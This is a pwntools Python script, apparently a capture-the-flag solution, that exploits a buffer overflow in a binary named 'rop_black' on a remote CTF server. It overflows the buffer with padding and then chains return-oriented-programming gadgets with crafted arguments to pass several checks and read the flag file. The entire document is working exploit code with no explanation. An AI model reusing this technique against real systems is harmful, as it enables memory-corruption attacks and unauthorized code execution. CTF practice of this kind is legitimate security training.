from pwn import *

exe = ELF("./public/rop_black")
#sh = process("./rop_black")
sh = remote("pwn.battlectf.online",1004)
payload = b"A"*22

payload += p32(0x080492ce) # check_african()

payload += p32(0x080492e8) # check_invitecode()
payload += p32(0x0804901e) # pop ebx ; ret
payload += p32(0xbae)

payload += p32(0x0804930b) # check_capcha()
payload += p32(0x080493ea) # pop edi ; pop ebp ; ret
payload += p32(0x0062023)
payload += p32(0x0bf1212)

payload += p32(0x08049293) # check_flag()
payload += p32(0x0804901e) # pop ebx ; ret
payload += p32(next(exe.search(b"flag.txt")))

payload += p32(0x080491c2) # read_flag


sh.sendline(payload)
sh.interactive()
